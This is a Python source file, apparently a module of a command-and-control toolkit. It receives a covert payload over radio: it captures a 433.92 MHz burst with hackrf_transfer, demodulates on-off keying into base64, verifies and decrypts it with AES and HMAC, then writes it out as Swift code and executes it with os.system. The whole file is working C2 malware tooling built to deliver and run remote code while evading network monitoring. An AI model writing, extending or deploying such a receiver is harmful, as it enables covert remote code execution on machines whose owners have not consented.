#!/usr/bin/env python3
# File: modules/c2/rf_stego_receiver.py

import numpy as np
import base64
import os
import json
import subprocess
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256

# Constants
CAPTURE_DIR = "rf_captures"
DECRYPTED_PAYLOAD_DIR = "payloads"
KEY_FILE = "keys/aes_key.txt"
LOG_FILE = "logs/rf_stego_receiver.log"
SAMPLE_RATE = "2M"
CENTER_FREQ = "433.92M"
DURATION = 5  # seconds
THRESHOLD = 0.01

Path(CAPTURE_DIR).mkdir(parents=True, exist_ok=True)
Path(DECRYPTED_PAYLOAD_DIR).mkdir(parents=True, exist_ok=True)
Path(os.path.dirname(LOG_FILE)).mkdir(parents=True, exist_ok=True)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.utcnow()}] {msg}\n")
    print(msg)

def capture_rf_signal():
    timestamp = int(datetime.utcnow().timestamp())
    output_file = f"{CAPTURE_DIR}/rf_burst_{timestamp}.bin"
    cmd = [
        "hackrf_transfer", "-r", output_file,
        "-f", CENTER_FREQ, "-s", SAMPLE_RATE,
        "-n", str(int(SAMPLE_RATE.replace("M", "")) * 1_000_000 * DURATION)
    ]
    log(f"[+] Listening for RF stego signal on {CENTER_FREQ}Hz")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return output_file

def demodulate_ook(signal_file):
    raw = np.fromfile(signal_file, dtype=np.uint8)
    signal = raw.astype(np.float32) - 127.5
    signal /= 127.5

    envelope = np.abs(signal)
    mean_val = np.mean(envelope)
    bitstream = ['1' if s > mean_val + THRESHOLD else '0' for s in envelope]

    bitstring = ''.join(bitstream)
    bytes_out = [bitstring[i:i + 8] for i in range(0, len(bitstring), 8)]
    decoded = b''

    for b in bytes_out:
        try:
            decoded += int(b, 2).to_bytes(1, 'big')
        except ValueError:
            continue

    try:
        base64_data = decoded.decode()
        return base64_data.strip()
    except UnicodeDecodeError:
        log("[!] Decoding error. No payload extracted.")
        return None

def load_key():
    if not os.path.exists(KEY_FILE):
        raise Exception("AES key not found.")
    with open(KEY_FILE, "r") as f:
        return f.read().strip().encode()

def decrypt_payload(encoded_data, key):
    try:
        raw = base64.b64decode(encoded_data)
        iv = raw[:16]
        hmac_sig = raw[16:48]
        ciphertext = raw[48:]

        h = HMAC.new(key, ciphertext, digestmod=SHA256)
        h.verify(hmac_sig)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext)
        return plaintext.rstrip(b"\x00")
    except Exception as e:
        log(f"[!] Decryption failed: {e}")
        return None

def execute_payload(payload_code):
    try:
        swift_path = f"{DECRYPTED_PAYLOAD_DIR}/extracted_payload.swift"
        with open(swift_path, "wb") as f:
            f.write(payload_code)
        log(f"[+] Swift payload extracted: {swift_path}")
        os.system(f"swift {swift_path}")
    except Exception as e:
        log(f"[!] Execution failed: {e}")

def main():
    log("[*] RF Stego Receiver started.")
    signal_file = capture_rf_signal()
    b64_data = demodulate_ook(signal_file)

    if not b64_data:
        log("[!] No payload detected in RF signal.")
        return

    key = load_key()
    decrypted = decrypt_payload(b64_data, key)
    if decrypted:
        execute_payload(decrypted)
        log("[+] Payload decrypted and executed.")
    else:
        log("[!] Payload decryption failed.")

    log("[*] Receiver finished.")

if __name__ == "__main__":
    main()
